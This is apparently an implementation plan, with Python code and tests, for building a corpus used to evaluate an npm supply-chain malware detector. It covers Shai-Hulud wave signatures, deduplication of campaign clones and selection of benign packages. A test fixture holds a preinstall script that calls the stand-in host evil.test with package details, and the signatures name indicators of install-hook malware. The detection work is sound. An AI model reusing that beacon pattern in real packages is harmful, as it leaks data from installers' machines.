# Argo — M1 Dataset, part B (Tasks 6-7)

> **For agentic workers:** REQUIRED SUB-SKILL: superpowers:subagent-driven-development or superpowers:executing-plans. Read the index `2026-09-11-argo-plan.md` first. Depends on Tasks 3-5.

---

### Task 6: Fingerprint, Shai-Hulud waves, diverse ordering, benign candidates

**Files:**
- Create: `argo/dataset/fingerprint.py`, `argo/dataset/waves.py`, `argo/dataset/select.py`, `argo/dataset/benign.py`, `tests/test_fingerprint.py`, `tests/test_waves.py`, `tests/test_select.py`

**Interfaces:**
- Consumes: `PackageFiles`, `LIFECYCLE_SCRIPTS` (Task 3)
- Produces:
  - `fingerprint(pkg: PackageFiles, name: str, version: str) -> str`
  - `@dataclass(frozen=True) class Wave: subgroup: Subgroup; start: str; end: str`; `WAVES: tuple[Wave, ...]`
  - `wave_for_date(date: str) -> Wave | None`
  - `signature(subgroup: Subgroup, pkg: PackageFiles) -> bool`
  - `matches_any_signature(pkg: PackageFiles) -> bool`
  - `diverse_order(cands: Sequence[T], date_of: Callable[[T], str], rng: random.Random, max_per_date: int) -> list[T]`
  - `POPULAR_CANDIDATES: list[str]`, `HARD_CANDIDATES: list[str]`

- [ ] **Step 1: Write the failing tests**

`tests/test_fingerprint.py`:

```python
from argo.dataset.fingerprint import fingerprint
from tests.helpers import make_pkg, pkg_json


def _clone(name: str, version: str):
    return make_pkg({
        "package.json": pkg_json(name, version, scripts={"preinstall": "node index.js"}),
        "index.js": f"require('https').get('http://evil.test/?p={name}&v={version}')",
        "README.md": f"# {name}",
    })


def test_campaign_clones_share_fingerprint():
    assert fingerprint(_clone("aaa-api", "9.9.9"), "aaa-api", "9.9.9") == fingerprint(
        _clone("bbb-auth", "1.0.0"), "bbb-auth", "1.0.0"
    )


def test_different_code_differs():
    other = make_pkg({"package.json": pkg_json("x"), "index.js": "console.log(1)"})
    assert fingerprint(other, "x", "1.0.0") != fingerprint(_clone("x", "1.0.0"), "x", "1.0.0")
```

`tests/test_waves.py`:

```python
from argo.dataset.waves import matches_any_signature, signature, wave_for_date
from tests.helpers import make_pkg, pkg_json

W1 = make_pkg({"package.json": pkg_json(scripts={"postinstall": "node bundle.js"}), "bundle.js": "x"})
W2 = make_pkg({
    "package.json": pkg_json(scripts={"preinstall": "node setup_bun.js"}),
    "setup_bun.js": "x",
    "bun_environment.js": "y",
})
W3_TANSTACK = make_pkg({
    "package.json": pkg_json(optionalDependencies={"@tanstack/setup": "github:tanstack/router#79ac"}),
    "router_init.js": "x",
})
W3_ANTV = make_pkg({"package.json": pkg_json(scripts={"preinstall": "bun run index.js"}), "index.js": "x"})
BENIGN = make_pkg({"package.json": pkg_json(scripts={"postinstall": "node install.js"}), "install.js": "x"})


def test_signatures():
    assert signature("shai_hulud_w1", W1)
    assert signature("shai_hulud_w2", W2)
    assert signature("shai_hulud_w3", W3_TANSTACK)
    assert signature("shai_hulud_w3", W3_ANTV)
    assert not signature("shai_hulud_w1", W2)


def test_benign_install_script_matches_no_wave():
    assert not matches_any_signature(BENIGN)


def test_wave_for_date():
    assert wave_for_date("2025-09-15").subgroup == "shai_hulud_w1"
    assert wave_for_date("2025-11-24").subgroup == "shai_hulud_w2"
    assert wave_for_date("2026-05-19").subgroup == "shai_hulud_w3"
    assert wave_for_date("2025-09-08") is None
```

`tests/test_select.py`:

```python
import random
from collections import Counter

from argo.dataset.select import diverse_order


def test_cap_applies_to_first_pass_and_keeps_everything():
    cands = [("a", "2025-01-01")] * 5 + [("b", "2025-02-01")] * 5
    cands = [(f"{n}{i}", d) for i, (n, d) in enumerate(cands)]
    out = diverse_order(cands, lambda c: c[1], random.Random(1), max_per_date=2)
    assert sorted(out) == sorted(cands)
    assert Counter(d for _, d in out[:4]) == {"2025-01-01": 2, "2025-02-01": 2}


def test_deterministic_with_seed():
    cands = [(str(i), f"2025-01-{i % 28 + 1:02d}") for i in range(100)]
    a = diverse_order(cands, lambda c: c[1], random.Random(7), 2)
    b = diverse_order(cands, lambda c: c[1], random.Random(7), 2)
    assert a == b
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `.venv/bin/pytest tests/test_fingerprint.py tests/test_waves.py tests/test_select.py -q`
Expected: FAIL with `ModuleNotFoundError`.

- [ ] **Step 3: Implement `argo/dataset/fingerprint.py`**

```python
import hashlib
import json

from argo.extract.archive import PackageFiles

_SKIP_PREFIXES = ("readme", "license", "licence", "changelog", "history")


def fingerprint(pkg: PackageFiles, name: str, version: str) -> str:
    """Content hash that ignores the package's own name/version, so campaign clones collide."""
    strip = [s.encode() for s in (name, version) if s]
    digests = []
    for path, data in pkg.files.items():
        base = path.rsplit("/", 1)[-1].lower()
        if base == "package.json" or base.startswith(_SKIP_PREFIXES):
            continue
        for s in strip:
            data = data.replace(s, b"")
        digests.append(hashlib.sha256(data).hexdigest())
    scripts = json.dumps(pkg.manifest().get("scripts") or {}, sort_keys=True)
    for s in (name, version):
        if s:
            scripts = scripts.replace(s, "")
    h = hashlib.sha256()
    h.update("\n".join(sorted(digests)).encode())
    h.update(scripts.encode())
    return h.hexdigest()
```

- [ ] **Step 4: Implement `argo/dataset/waves.py`**

```python
from dataclasses import dataclass

from argo.extract.archive import LIFECYCLE_SCRIPTS, PackageFiles
from argo.schema import Subgroup


@dataclass(frozen=True)
class Wave:
    subgroup: Subgroup
    start: str
    end: str


WAVES: tuple[Wave, ...] = (
    Wave("shai_hulud_w1", "2025-09-14", "2025-09-20"),
    Wave("shai_hulud_w2", "2025-11-21", "2025-11-30"),
    Wave("shai_hulud_w3", "2026-05-10", "2026-05-25"),
)


def wave_for_date(date: str) -> Wave | None:
    return next((w for w in WAVES if w.start <= date <= w.end), None)


def _lifecycle_values(pkg: PackageFiles) -> list[str]:
    scripts = pkg.manifest().get("scripts")
    if not isinstance(scripts, dict):
        return []
    return [str(scripts.get(k, "")) for k in LIFECYCLE_SCRIPTS]


def _dep_specs(pkg: PackageFiles) -> list[str]:
    m = pkg.manifest()
    specs: list[str] = []
    for field in ("dependencies", "optionalDependencies"):
        deps = m.get(field)
        if isinstance(deps, dict):
            specs += [str(v) for v in deps.values()]
    return specs


def signature(subgroup: Subgroup, pkg: PackageFiles) -> bool:
    life = _lifecycle_values(pkg)
    if subgroup == "shai_hulud_w1":
        return "bundle.js" in pkg.files and any("bundle.js" in v for v in life)
    if subgroup == "shai_hulud_w2":
        return "setup_bun.js" in pkg.files and "bun_environment.js" in pkg.files
    if subgroup == "shai_hulud_w3":
        return any("bun run" in v for v in life) or any(
            s.startswith("github:") for s in _dep_specs(pkg)
        )
    return False


def matches_any_signature(pkg: PackageFiles) -> bool:
    return any(signature(w.subgroup, pkg) for w in WAVES)
```

- [ ] **Step 5: Implement `argo/dataset/select.py` and `argo/dataset/benign.py`**

`argo/dataset/select.py`:

```python
import random
from collections import Counter
from collections.abc import Callable, Sequence
from typing import TypeVar

T = TypeVar("T")


def diverse_order(
    cands: Sequence[T], date_of: Callable[[T], str], rng: random.Random, max_per_date: int
) -> list[T]:
    """Shuffled order where at most `max_per_date` items per date come first (spreads campaigns);
    the overflow follows, so consumers can keep pulling when items get rejected."""
    shuffled = list(cands)
    rng.shuffle(shuffled)
    first: list[T] = []
    rest: list[T] = []
    per_date: Counter[str] = Counter()
    for c in shuffled:
        d = date_of(c)
        if per_date[d] < max_per_date:
            first.append(c)
            per_date[d] += 1
        else:
            rest.append(c)
    return first + rest
```

`argo/dataset/benign.py`:

```python
"""Benign candidates, tried in order. Popular: chosen version has no install script.
Hard: chosen version has preinstall/install/postinstall (legitimate install-time behaviour)."""

POPULAR_CANDIDATES = [
    "react", "react-dom", "express", "axios", "typescript", "chalk", "commander", "zod",
    "vite", "eslint", "prettier", "dayjs", "uuid", "date-fns", "yargs", "dotenv", "semver",
    "ws", "webpack", "rollup", "vue", "tailwindcss", "mongoose", "pino", "fastify", "undici",
    "jest", "next", "lit", "immer",
]

HARD_CANDIDATES = [
    "esbuild", "sharp", "puppeteer", "@swc/core", "core-js", "protobufjs", "electron",
    "bcrypt", "sqlite3", "better-sqlite3", "canvas", "@parcel/watcher", "cypress", "prisma",
    "@prisma/client", "nodemon", "es5-ext", "msw", "@sentry/cli", "lefthook",
    "@biomejs/biome", "deasync", "re2", "ffmpeg-static", "chromedriver", "geckodriver",
    "@tensorflow/tfjs-node", "husky", "core-js-pure", "@datadog/pprof",
]
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_fingerprint.py tests/test_waves.py tests/test_select.py -q`
Expected: PASS (7 tests).

- [ ] **Step 7: Gate and commit**

```bash
.venv/bin/ruff format argo tests && .venv/bin/pytest -q && .venv/bin/mypy argo && .venv/bin/ruff check --fix argo tests
git add argo/dataset tests/test_fingerprint.py tests/test_waves.py tests/test_select.py
git commit -m "Add dedup fingerprint, Shai-Hulud wave signatures and candidate ordering"
```

---

### Task 7: Corpus builder, `argo dataset build`, real build

**Files:**
- Create: `argo/dataset/build.py`, `tests/test_build.py`
- Modify: `argo/cli.py` (add `dataset build`)

**Interfaces:**
- Consumes: everything from Tasks 3-6.
- Produces:
  - `@dataclass(frozen=True) class Quotas` (defaults: nato 28, compromesso 12, per_wave 5, popular 20, hard 20, history_malicious 40, history_compromised_max 10, history_benign_each 5, history_wave_extra 5)
  - `class CorpusBuilder(data_dir, registry: RegistryLike, manifest, download: Callable[[SamplePath], Path], seed=SEED, log=print)` with `take_datadog(...)`, `take_benign(...)`, `add_pairs(shai: list[Sample]) -> list[Sample]`, `build(paths, quotas=Quotas()) -> list[Sample]`
  - `build_corpus(data_dir: Path = DATA_DIR, quotas: Quotas = Quotas()) -> list[Sample]` writing `data/corpus.jsonl`, `data/corpus_meta.json`, `results/dataset_summary.json`
  - `load_corpus(path: Path = CORPUS_PATH) -> list[Sample]`
  - CLI: `argo dataset build`

- [ ] **Step 1: Write the failing tests `tests/test_build.py`**

```python
from pathlib import Path
from typing import Any

from argo.dataset.build import CorpusBuilder
from argo.dataset.datadog import SamplePath
from argo.dataset.registry import RegistryError
from tests.helpers import make_datadog_zip, make_tgz, pkg_json

T = "T00:00:00Z"


class FakeRegistry:
    def __init__(self, root: Path, packages: dict[str, dict[str, dict[str, str]]],
                 times: dict[str, dict[str, str]]) -> None:
        self.root, self.packages, self.times = root, packages, times

    def packument(self, name: str) -> dict[str, Any]:
        if name not in self.times:
            raise RegistryError(name)
        return {"time": self.times[name], "versions": {v: {} for v in self.packages[name]}}

    def tarball(self, name: str, version: str) -> Path:
        files = self.packages.get(name, {}).get(version)
        if files is None:
            raise RegistryError(f"{name}@{version}")
        return make_tgz(self.root / "cache" / f"{name}-{version}.tgz", files)


def _sp(cat: str, name: str, version: str, date: str) -> SamplePath:
    return SamplePath(cat, name, version, date, f"samples/npm/{cat}/{name}/{version}/{date}-{name}.zip")


def _setup(tmp_path: Path):
    zips: dict[str, Path] = {}

    def add_zip(sp: SamplePath, files: dict[str, str], time: dict[str, str]) -> None:
        zips[sp.id] = make_datadog_zip(
            tmp_path / "quarantine" / f"{sp.name}-{sp.version}.zip", files, {"time": time},
            pkgdir=sp.name, password=None,
        )

    w1 = _sp("compromised_lib", "host-a", "1.0.1", "2025-09-15")
    add_zip(w1, {"package.json": pkg_json("host-a", "1.0.1", scripts={"postinstall": "node bundle.js"}),
                 "bundle.js": "payload", "dist/a.js": "a"},
            {"1.0.0": "2025-08-01" + T, "1.0.1": "2025-09-15" + T})
    evil_a = _sp("malicious_intent", "evil-a", "9.9.9", "2025-03-01")
    evil_b = _sp("malicious_intent", "evil-b", "9.9.9", "2025-03-02")
    for sp in (evil_a, evil_b):
        add_zip(sp, {"package.json": pkg_json(sp.name, "9.9.9", scripts={"preinstall": "node i.js"}),
                     "i.js": f"send('{sp.name}')"}, {"9.9.9": sp.date + T})
    registry = FakeRegistry(
        tmp_path,
        packages={
            "host-a": {"1.0.0": {"package.json": pkg_json("host-a", "1.0.0")},
                       "0.9.0": {"package.json": pkg_json("host-a", "0.9.0")}},
            "good": {"2.0.0": {"package.json": pkg_json("good", "2.0.0", scripts={"postinstall": "node b.js"})},
                     "2.1.0": {"package.json": pkg_json("good", "2.1.0", scripts={"postinstall": "node b.js"})}},
        },
        times={"good": {"2.0.0": "2025-01-10" + T, "2.1.0": "2025-04-01" + T}},
    )
    manifest: dict[str, list[str] | None] = {"host-a": ["1.0.1"], "evil-a": None, "evil-b": None}
    builder = CorpusBuilder(tmp_path, registry, manifest, lambda sp: zips[sp.id], log=lambda _: None)
    return builder, w1, evil_a, evil_b


def test_wave_sample_gets_clean_previous_version(tmp_path):
    builder, w1, *_ = _setup(tmp_path)
    [s] = builder.take_datadog([w1], 1, lambda sp, pkg: "shai_hulud_w1", "test")
    assert s.subgroup == "shai_hulud_w1" and s.label == "malicious"
    assert s.prev_version == "1.0.0" and s.prev_archive_path is not None
    assert not Path(s.archive_path).is_absolute()


def test_campaign_clones_are_deduplicated(tmp_path):
    builder, _, evil_a, evil_b = _setup(tmp_path)
    got = builder.take_datadog([evil_a, evil_b], 2, lambda sp, pkg: "nato_malevolo", "test")
    assert len(got) == 1 and got[0].prev_version is None


def test_pairs_link_both_ways(tmp_path):
    builder, w1, *_ = _setup(tmp_path)
    shai = builder.take_datadog([w1], 1, lambda sp, pkg: "shai_hulud_w1", "test")
    [pair] = builder.add_pairs(shai)
    assert pair.subgroup == "pulito_accoppiato" and pair.label == "benign"
    assert pair.version == "1.0.0" and pair.pair_id == shai[0].id and shai[0].pair_id == pair.id


def test_benign_install_script_filter(tmp_path):
    builder, *_ = _setup(tmp_path)
    window = ("2025-01-01", "2026-08-31")
    none = builder.take_benign(["good"], 1, window, "benigno_popolare", "test", None, need_install=False)
    assert none == []
    [hard] = builder.take_benign(["good"], 1, window, "benigno_difficile", "test", None, need_install=True)
    assert hard.version == "2.1.0" and hard.prev_version == "2.0.0"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `.venv/bin/pytest tests/test_build.py -q`
Expected: FAIL with `ModuleNotFoundError: No module named 'argo.dataset.build'`.

- [ ] **Step 3: Implement `argo/dataset/build.py`**

```python
import hashlib
import json
import random
from collections import Counter
from collections.abc import Callable, Sequence
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import httpx

from argo.config import CORPUS_PATH, CUTOFF_DATE, DATA_DIR, RESULTS_DIR, SEED, TEST_END_DATE
from argo.dataset.benign import HARD_CANDIDATES, POPULAR_CANDIDATES
from argo.dataset.datadog import (
    SamplePath,
    download_sample,
    ensure_repo,
    list_sample_paths,
    load_manifest,
)
from argo.dataset.fingerprint import fingerprint
from argo.dataset.registry import (
    Registry,
    RegistryError,
    RegistryLike,
    previous_version,
    versions_in_window,
)
from argo.dataset.select import diverse_order
from argo.dataset.waves import WAVES, matches_any_signature, signature, wave_for_date
from argo.extract.archive import INSTALL_SCRIPTS, ArchiveError, PackageFiles, read_datadog_zip, read_npm_tgz
from argo.jsonl import read_models, write_jsonl
from argo.schema import HistorySet, Sample, Split, Subgroup

SubgroupFn = Callable[[SamplePath, PackageFiles], Subgroup | None]
HISTORY_BENIGN_WINDOW = ("2023-01-01", "2024-12-31")
TEST_WINDOW = (CUTOFF_DATE, TEST_END_DATE)


@dataclass(frozen=True)
class Quotas:
    nato: int = 28
    compromesso: int = 12
    per_wave: int = 5
    popular: int = 20
    hard: int = 20
    history_malicious: int = 40
    history_compromised_max: int = 10
    history_benign_each: int = 5
    history_wave_extra: int = 5


def _sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _wave_fn(subgroup: Subgroup) -> SubgroupFn:
    return lambda sp, pkg: subgroup if signature(subgroup, pkg) else None


def _not_wave(subgroup: Subgroup) -> SubgroupFn:
    return lambda sp, pkg: None if matches_any_signature(pkg) else subgroup


class CorpusBuilder:
    def __init__(
        self,
        data_dir: Path,
        registry: RegistryLike,
        manifest: dict[str, list[str] | None],
        download: Callable[[SamplePath], Path],
        seed: int = SEED,
        log: Callable[[str], None] = print,
    ) -> None:
        self.data_dir = data_dir.resolve()
        self.registry = registry
        self.manifest = manifest
        self.download = download
        self.rng = random.Random(seed)
        self.log = log
        self.seen_fp: set[str] = set()
        self.seen_names: set[str] = set()
        self.infos: dict[str, dict[str, Any]] = {}

    def _rel(self, p: Path) -> str:
        return str(p.resolve().relative_to(self.data_dir))

    def _prev_archive(self, name: str, prev: str | None) -> str | None:
        if prev is None:
            return None
        try:
            return self._rel(self.registry.tarball(name, prev))
        except (RegistryError, httpx.HTTPError) as e:
            self.log(f"  previous version unavailable {name}@{prev}: {e}")
            return None

    def _datadog_sample(
        self, sp: SamplePath, subgroup_for: SubgroupFn, split: Split, history_set: HistorySet | None
    ) -> Sample | None:
        if sp.name in self.seen_names:
            return None
        try:
            path = self.download(sp)
            pkg, info = read_datadog_zip(path)
        except (ArchiveError, httpx.HTTPError) as e:
            self.log(f"  skip {sp.id}: {e}")
            return None
        subgroup = subgroup_for(sp, pkg)
        if subgroup is None:
            return None
        fp = fingerprint(pkg, sp.name, sp.version)
        if fp in self.seen_fp:
            return None
        bad = self.manifest.get(sp.name, [sp.version])
        time_map = info.get("time") or {}
        prev = None if bad is None else previous_version(time_map, sp.version, exclude=bad)
        self.seen_fp.add(fp)
        self.seen_names.add(sp.name)
        self.infos[sp.id] = info
        return Sample(
            id=sp.id, name=sp.name, version=sp.version, prev_version=prev, label="malicious",
            subgroup=subgroup, date=sp.date, split=split, history_set=history_set,
            source="datadog", archive_path=self._rel(path),
            prev_archive_path=self._prev_archive(sp.name, prev),
            sha256=_sha256(path), fingerprint=fp,
        )

    def take_datadog(
        self,
        cands: Sequence[SamplePath],
        n: int,
        subgroup_for: SubgroupFn,
        split: Split,
        history_set: HistorySet | None = None,
        max_per_date: int = 2,
        label: str = "",
    ) -> list[Sample]:
        out: list[Sample] = []
        for sp in diverse_order(cands, lambda s: s.date, self.rng, max_per_date):
            if len(out) >= n:
                break
            s = self._datadog_sample(sp, subgroup_for, split, history_set)
            if s is not None:
                out.append(s)
                self.log(f"  + {label or s.subgroup} {s.id}")
        if len(out) < n:
            self.log(f"WARNING {label}: only {len(out)}/{n} samples")
        return out

    def _npm_sample(
        self, name: str, window: tuple[str, str], subgroup: Subgroup, split: Split,
        history_set: HistorySet | None, need_install: bool,
    ) -> Sample | None:
        if name in self.seen_names:
            return None
        try:
            time_map = self.registry.packument(name).get("time") or {}
            versions = versions_in_window(time_map, *window)
            if not versions:
                return None
            version = versions[-1]
            prev = previous_version(time_map, version)
            if prev is None:
                return None
            path = self.registry.tarball(name, version)
            pkg = read_npm_tgz(path.read_bytes())
            scripts = pkg.manifest().get("scripts") or {}
            has_install = isinstance(scripts, dict) and any(k in scripts for k in INSTALL_SCRIPTS)
            if has_install != need_install:
                return None
            prev_path = self.registry.tarball(name, prev)
        except (RegistryError, ArchiveError, httpx.HTTPError) as e:
            self.log(f"  skip {name}: {e}")
            return None
        fp = fingerprint(pkg, name, version)
        self.seen_names.add(name)
        self.seen_fp.add(fp)
        return Sample(
            id=f"{name}@{version}", name=name, version=version, prev_version=prev, label="benign",
            subgroup=subgroup, date=time_map[version][:10], split=split, history_set=history_set,
            source="npm", archive_path=self._rel(path), prev_archive_path=self._rel(prev_path),
            sha256=_sha256(path), fingerprint=fp,
        )

    def take_benign(
        self, names: Sequence[str], n: int, window: tuple[str, str], subgroup: Subgroup,
        split: Split, history_set: HistorySet | None, need_install: bool,
    ) -> list[Sample]:
        out: list[Sample] = []
        for name in names:
            if len(out) >= n:
                break
            s = self._npm_sample(name, window, subgroup, split, history_set, need_install)
            if s is not None:
                out.append(s)
                self.log(f"  + {subgroup} {s.id}")
        if len(out) < n:
            self.log(f"WARNING {subgroup}/{split}: only {len(out)}/{n} samples")
        return out

    def add_pairs(self, shai: list[Sample]) -> list[Sample]:
        pairs: list[Sample] = []
        for s in shai:
            if s.prev_version is None or s.prev_archive_path is None:
                self.log(f"WARNING no clean pair for {s.id}")
                continue
            time_map = self.infos.get(s.id, {}).get("time") or {}
            bad = self.manifest.get(s.name) or []
            prev_of_prev = previous_version(time_map, s.prev_version, exclude=bad)
            archive = self.data_dir / s.prev_archive_path
            try:
                pkg = read_npm_tgz(archive.read_bytes())
            except ArchiveError as e:
                self.log(f"WARNING bad clean archive for {s.id}: {e}")
                continue
            pair = Sample(
                id=f"{s.name}@{s.prev_version}", name=s.name, version=s.prev_version,
                prev_version=prev_of_prev, label="benign", subgroup="pulito_accoppiato",
                date=(time_map.get(s.prev_version) or s.date)[:10], split="test",
                source="npm", archive_path=s.prev_archive_path,
                prev_archive_path=self._prev_archive(s.name, prev_of_prev),
                sha256=_sha256(archive), fingerprint=fingerprint(pkg, s.name, s.prev_version),
                pair_id=s.id,
            )
            s.pair_id = pair.id
            pairs.append(pair)
        return pairs

    def build(self, paths: Sequence[SamplePath], q: Quotas = Quotas()) -> list[Sample]:
        post = [p for p in paths if CUTOFF_DATE <= p.date <= TEST_END_DATE]
        pre = [p for p in paths if p.date < CUTOFF_DATE]
        samples: list[Sample] = []
        shai_test: list[Sample] = []
        for w in WAVES:
            cands = [p for p in post if p.category == "compromised_lib" and w.start <= p.date <= w.end]
            fn = _wave_fn(w.subgroup)
            shai_test += self.take_datadog(cands, q.per_wave, fn, "test", max_per_date=3, label=w.subgroup)
            if w.subgroup in ("shai_hulud_w1", "shai_hulud_w2"):
                hs: HistorySet = "w1" if w.subgroup == "shai_hulud_w1" else "w2"
                samples += self.take_datadog(
                    cands, q.history_wave_extra, fn, "history", hs, 3, f"history {w.subgroup}"
                )
        samples += shai_test + self.add_pairs(shai_test)
        outside = [p for p in post if wave_for_date(p.date) is None]
        samples += self.take_datadog(
            [p for p in outside if p.category == "compromised_lib"], q.compromesso,
            _not_wave("compromesso"), "test", label="compromesso",
        )
        samples += self.take_datadog(
            [p for p in post if p.category == "malicious_intent"], q.nato,
            _not_wave("nato_malevolo"), "test", label="nato_malevolo",
        )
        hist_comp = self.take_datadog(
            [p for p in pre if p.category == "compromised_lib"], q.history_compromised_max,
            _not_wave("compromesso"), "history", "base", label="history compromesso",
        )
        samples += hist_comp
        samples += self.take_datadog(
            [p for p in pre if p.category == "malicious_intent"],
            q.history_malicious - len(hist_comp), _not_wave("nato_malevolo"), "history", "base",
            label="history nato_malevolo",
        )
        samples += self.take_benign(POPULAR_CANDIDATES, q.popular, TEST_WINDOW,
                                    "benigno_popolare", "test", None, need_install=False)
        samples += self.take_benign(HARD_CANDIDATES, q.hard, TEST_WINDOW,
                                    "benigno_difficile", "test", None, need_install=True)
        samples += self.take_benign(POPULAR_CANDIDATES, q.history_benign_each, HISTORY_BENIGN_WINDOW,
                                    "benigno_popolare", "history", "base", need_install=False)
        samples += self.take_benign(HARD_CANDIDATES, q.history_benign_each, HISTORY_BENIGN_WINDOW,
                                    "benigno_difficile", "history", "base", need_install=True)
        return samples


def summarize(samples: Sequence[Sample]) -> dict[str, int]:
    return dict(sorted(Counter(f"{s.split}/{s.subgroup}" for s in samples).items()))


def build_corpus(data_dir: Path = DATA_DIR, quotas: Quotas = Quotas()) -> list[Sample]:
    cache, quarantine = data_dir / "cache", data_dir / "quarantine"
    headers = {"User-Agent": "argo-thesis-poc"}
    with httpx.Client(timeout=120, follow_redirects=True, headers=headers) as client:
        repo = cache / "datadog-repo"
        commit = ensure_repo(repo)
        builder = CorpusBuilder(
            data_dir, Registry(cache, client), load_manifest(client, cache),
            lambda sp: download_sample(sp, quarantine, client),
        )
        samples = builder.build(list_sample_paths(repo), quotas)
    write_jsonl(data_dir / "corpus.jsonl", [s.model_dump() for s in samples])
    meta = {
        "datadog_commit": commit,
        "seed": SEED,
        "built_at": datetime.now(UTC).isoformat(),
        "counts": summarize(samples),
    }
    (data_dir / "corpus_meta.json").write_text(json.dumps(meta, indent=2))
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    (RESULTS_DIR / "dataset_summary.json").write_text(json.dumps(meta, indent=2))
    return samples


def load_corpus(path: Path = CORPUS_PATH) -> list[Sample]:
    return read_models(path, Sample)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_build.py -q`
Expected: PASS (4 tests).

- [ ] **Step 5: Add the CLI command in `argo/cli.py`**

Inside `build_parser()`, after the `version` parser:

```python
    ds = sub.add_parser("dataset", help="dataset commands")
    ds_sub = ds.add_subparsers(dest="dataset_command", required=True)
    ds_sub.add_parser("build", help="select samples and write data/corpus.jsonl").set_defaults(
        func=_dataset_build
    )
```

And the handler at module level:

```python
def _dataset_build(_: argparse.Namespace) -> int:
    from argo.dataset.build import build_corpus, summarize

    samples = build_corpus()
    for key, n in summarize(samples).items():
        print(f"{key:40s} {n}")
    return 0
```

- [ ] **Step 6: Gate and commit the code**

```bash
.venv/bin/ruff format argo tests && .venv/bin/pytest -q && .venv/bin/mypy argo && .venv/bin/ruff check --fix argo tests
git add argo/dataset/build.py argo/cli.py tests/test_build.py
git commit -m "Add corpus builder and dataset build command"
```

- [ ] **Step 7: Run the real build (network, ~20-60 min, resumable thanks to the caches)**

Run: `.venv/bin/argo dataset build 2>&1 | tee /tmp/argo-dataset.log`
Expected: final table of counts close to the quotas: `test/nato_malevolo 28`, `test/compromesso 12`, `test/shai_hulud_w1..w3 5` each, `test/pulito_accoppiato` up to 15, `test/benigno_popolare 20`, `test/benigno_difficile 20`, `history/...` rows. Any `WARNING ... only x/y` lines are shortages to report: if a test quota is short by more than 3, stop and report to the user before continuing (the spec allows topping up `nato_malevolo` when `compromesso` is short: rerun with `Quotas(nato=28 + missing, compromesso=available)` from a Python shell).

- [ ] **Step 8: Sanity check the corpus without opening malware**

```bash
.venv/bin/python - <<'EOF'
from argo.dataset.build import load_corpus
c = load_corpus()
test = [s for s in c if s.split == "test"]
print(len(c), "samples;", len(test), "test;", sum(s.label == "malicious" for s in test), "malicious in test")
print("test malicious without diff:", sum(s.label == "malicious" and s.prev_archive_path is None for s in test))
print("pairs:", sum(s.pair_id is not None for s in test))
EOF
git status --short   # data/ must NOT appear; results/dataset_summary.json should
```

- [ ] **Step 9: Commit the dataset summary**

```bash
git add results/dataset_summary.json
git commit -m "Record dataset composition and DataDog commit"
```
